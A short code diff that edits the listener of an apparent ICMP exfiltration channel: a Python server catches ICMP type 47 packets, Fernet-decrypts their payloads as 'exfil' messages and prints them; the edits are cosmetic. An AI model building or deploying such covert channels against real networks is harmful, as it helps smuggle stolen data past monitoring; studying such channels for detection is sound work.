@@ -15,15 +15,12 @@ def server():
         # Receive the packet
         packet, source = _socket.recvfrom(65535)
 
-        # Extract the header from the packet
+        # Extract & unpack the header from the packet
         header = packet[20:28]
-
-        # Unpack the header
         ICMP_TYPE, ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQUENCE = struct.unpack(ICMP_HEADER_FMT, header)
 
         # Check that the package is of type 47
         if ICMP_TYPE == 47:
-
             # Extract the data from the packet
             data = packet[28:]
             encryped_exfil_message = struct.pack(f'{len(packet[28:])}' + ICMP_DATA_FMT, data)
@@ -33,7 +30,7 @@ def server():
             decrypted_exfil_message = fernet.decrypt(encryped_exfil_message)
 
             # Print the decrypted data
-            print(decrypted_exfil_message)
+            print(decrypted_exfil_message.decode('utf-8'))
 
 def main():
     server()
